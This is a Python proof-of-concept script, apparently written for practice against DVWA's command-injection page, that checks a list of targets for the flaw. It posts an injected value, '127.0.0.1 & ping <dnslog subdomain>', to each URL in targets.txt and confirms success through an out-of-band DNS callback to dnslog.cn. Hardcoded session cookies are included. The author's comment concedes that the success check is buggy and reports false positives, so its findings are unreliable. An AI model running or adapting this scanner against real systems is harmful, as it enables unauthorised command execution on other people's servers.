"""
 @Author: UpDown
 @FileName: dvwa_command_poc.py
 @Time: 2022/5/8 22:16
"""

import requests

# 每次请求获取dnslog的子域名
def get_domain():
    import requests

    cookies = {
        'PHPSESSID': '93t3c18q5opfsp971ed0gttca0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        # 'Cookie': 'PHPSESSID=93t3c18q5opfsp971ed0gttca0',
        'Proxy-Connection': 'keep-alive',
        'Referer': 'http://dnslog.cn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    }


    response = requests.get('http://dnslog.cn/getdomain.php', cookies=cookies, headers=headers)
    # print(response.text)
    return response.text


# 获取dnslog的值
def get_dnslog_info():
    import requests

    cookies = {
        'PHPSESSID': '93t3c18q5opfsp971ed0gttca0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        # 'Cookie': 'PHPSESSID=93t3c18q5opfsp971ed0gttca0',
        'Proxy-Connection': 'keep-alive',
        'Referer': 'http://dnslog.cn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    }

    # params = {
    #     't': '0.48901725863484713',
    # }

    response = requests.get('http://dnslog.cn/getrecords.php', cookies=cookies, headers=headers,
                            verify=False)
    # print(response.text)
    return response.text

# 目标机发起dnslog请求
def check_poc(domain):
    cookies = {
        'security': 'low',
        'csrftoken': '4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q',
        'PHPSESSID': 'uq88rfp3bvf77kqnrvjsteafb0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'security=low; csrftoken=4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q; PHPSESSID=uq88rfp3bvf77kqnrvjsteafb0',
        'Origin': 'http://127.0.0.1',
        'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/exec/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'ip': f'127.0.0.1 & ping {get_domain()}',
        'Submit': 'Submit',
    }

    try:
        response = requests.post(domain, cookies=cookies, headers=headers, data=data)
        # print(response.text)

        # yumu判断语句有bug
        if int(response.status_code) == 200 and get_dnslog_info():
            # print(get_dnslog_info())
            print("存在命令执行漏洞")
    except Exception as e:
        print('oops,出错了')


if __name__ == '__main__':
    with open("./targets.txt") as f:
        for i in f.readlines():
            check_poc(i.replace('\n',''))
    # get_dnslog_info()
    # get_domain()